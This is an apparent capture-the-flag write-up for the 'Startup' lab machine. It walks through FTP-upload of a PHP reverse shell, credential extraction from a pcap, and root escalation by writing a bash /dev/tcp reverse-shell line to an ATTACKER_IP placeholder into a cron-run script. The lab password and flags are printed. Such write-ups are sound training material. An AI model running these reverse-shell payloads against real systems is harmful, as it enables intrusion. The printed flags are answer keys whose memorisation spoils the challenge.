# Startup — CTF Write-up

## Target Information

| Information | Details |
|---|---|
| **Target IP** | `10.129.190.27` |
| **Operating System** | Linux |

---

## Enumeration

### Nmap Scan

The first step was to perform a full TCP port scan with service/version detection and default scripts:

```bash
nmap -sC -sV -p- -Pn -oN Startup.txt 10.129.190.27
```

### Scan Results

```text
Nmap 7.99 scan initiated Wed Sep  2 17:40:55 2026
Nmap scan report for 10.129.190.27

Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Sep 02 16:49 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.150.67
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 641.75 seconds
```

### Findings

Three TCP ports were identified as open:

- **Port 21/tcp** → FTP (`vsftpd 3.0.3`) — Anonymous login allowed, writable `/ftp` directory available.
- **Port 22/tcp** → SSH (`OpenSSH 7.2p2 Ubuntu`)
- **Port 80/tcp** → HTTP (`Apache httpd 2.4.18`) — Web server displaying a maintenance page.

### Web & Directory Enumeration

Navigating to `http://10.129.190.27/` showed a maintenance page with no useful content. 

Performing directory busting revealed:

```text
/files/
```

Accessing `/files/` via browser revealed the contents of the FTP server (`important.jpg`, `notice.txt`, and the writable `ftp` directory).

---

## Exploitation

### FTP File Upload to Web Shell

Since anonymous FTP allowed writing files inside the `ftp` directory, and this folder was publicly accessible via the web server at `/files/ftp/`, a PHP reverse shell was uploaded.

1. Prepared a PHP reverse shell (`shell.php`) configured with the attacker's IP and port `4444`.
2. Uploaded the shell via FTP to the `/ftp` folder.
3. Started a Netcat listener on the attack machine:

```bash
nc -lvnp 4444
```

4. Triggered the web shell by requesting the following URL in the browser:

```text
http://10.129.190.27/files/ftp/shell.php
```

This established a reverse shell connection as `www-data`.

---

## Post-Shell Enumeration

### PCAP Analysis

While enumerating the filesystem as `www-data`, an interesting file was located:

```text
suspicious.pcapng
```

To analyze the network capture locally:
1. Transferred `suspicious.pcapng` to the attack machine using Netcat.
2. Opened the file in **Wireshark**.
3. Inspected the captured traffic using **Follow TCP Stream**.

The packet capture contained plaintext credentials for the user `lennie`:

```text
lennie:c4ntg3t3n0ughsp1c3
```

### Lateral Movement to Lennie

Using the extracted credentials, an SSH connection was established:

```bash
ssh lennie@10.129.190.27
```

After authenticating as `lennie`, the `user.txt` flag was recovered from the home directory.

---

## Privilege Escalation

### Scheduled Task & Writable Script Analysis

During manual enumeration, a custom script was discovered inside Lennie's home directory:

```text
/home/lennie/scripts/planner.sh
```

Inspecting `planner.sh` showed that it executes another script located at `/etc/print.sh`:

```bash
#!/bin/bash
# planner.sh calls /etc/print.sh
/etc/print.sh
```

Checking file permissions revealed that `/etc/print.sh` was **writable** by `lennie`.

Using `pspy` (unprivileged process monitoring), it was confirmed that `planner.sh` was being triggered automatically on a schedule by `root`.

### Exploitation

1. Appended a reverse shell payload to `/etc/print.sh`:

```bash
echo "#!/bin/bash" > /etc/print.sh
echo "bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1" >> /etc/print.sh
```

2. Started a Netcat listener on port `5555`:

```bash
nc -lvnp 5555
```

3. When the scheduled task executed `planner.sh` as root, it invoked the modified `/etc/print.sh`, granting an interactive **root shell**.

---

## Flags

### User Flag

```text
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

### Root Flag

```text
THM{f963aaa6a430f210222158ae15c3d76d}
```

---

## Lessons Learned

1. **Always analyze unusual non-standard files** (`.pcapng`, backup archives, logs) discovered on the target filesystem.
2. **Wireshark TCP stream analysis** is a powerful technique for extracting cleartext credentials from captured traffic.
3. **When cron jobs are not listed in `/etc/crontab` or `crontab -l`**, use process monitoring tools like `pspy` to identify hidden scheduled system tasks.
4. **Writable scripts executed by root tasks** provide a direct and straightforward vector for local privilege escalation.

---

## Attack Chain Summary

```text
Port 21 (FTP) / Port 80 (HTTP)
  │
  ├── Anonymous FTP Login (Writable /ftp)
  │
  ├── Web Directory /files/ftp Discovered
  │
  └── Upload PHP Reverse Shell (shell.php)
          │
          ↓
   Web Shell Access (www-data)
          │
          ↓
  Discovered suspicious.pcapng
          │
          ↓
  Analyzed TCP Stream in Wireshark
          │
          ↓
  Extracted Lennie Credentials
          │
          ↓
     SSH Access (lennie)
          │
          ↓
  Discovered planner.sh executing /etc/print.sh
          │
          ↓
  Confirmed Root Scheduled Task via pspy
          │
          ↓
  Injected Reverse Shell into /etc/print.sh
          │
          ↓
      Root Shell
```